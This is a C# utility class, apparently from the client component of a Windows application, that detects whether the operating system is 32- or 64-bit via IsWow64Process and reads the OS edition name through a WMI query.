using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;

namespace xClient.Core.Information
{
    public static class OSInfo
    {
        #region BITS

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process(
            [In] IntPtr hProcess,
            [Out] out bool wow64Process
        );

        /// <summary>
        /// Determines if the current application is 32 or 64-bit.
        /// </summary>
        public static int Bits
        {
            get { return is64BitOperatingSystem ? 64 : 32; }
        }

        public static bool is64BitProcess = (IntPtr.Size == 8);

        public static bool is64BitOperatingSystem = is64BitProcess || InternalCheckIsWow64();

        public static bool InternalCheckIsWow64()
        {
            if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) ||
                Environment.OSVersion.Version.Major >= 6)
            {
                using (Process p = Process.GetCurrentProcess())
                {
                    bool retVal;
                    if (!IsWow64Process(p.Handle, out retVal))
                    {
                        return false;
                    }
                    return retVal;
                }
            }
            else
            {
                return false;
            }
        }

        #endregion BITS

        #region NAME

        private static string _osName;

        /// <summary>
        /// Gets the name of the operating system running on this computer (including the edition).
        /// </summary>
        public static string Name
        {
            get
            {
                if (_osName != null)
                    return _osName;

                string name = "Uknown OS";
                using (
                    ManagementObjectSearcher searcher =
                        new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject os in searcher.Get())
                    {
                        name = os["Caption"].ToString();
                        break;
                    }
                }

                if (name.StartsWith("Microsoft"))
                    name = name.Substring(name.IndexOf(" ", StringComparison.Ordinal) + 1);

                _osName = name;
                return _osName;
            }
        }

        #endregion NAME
    }
}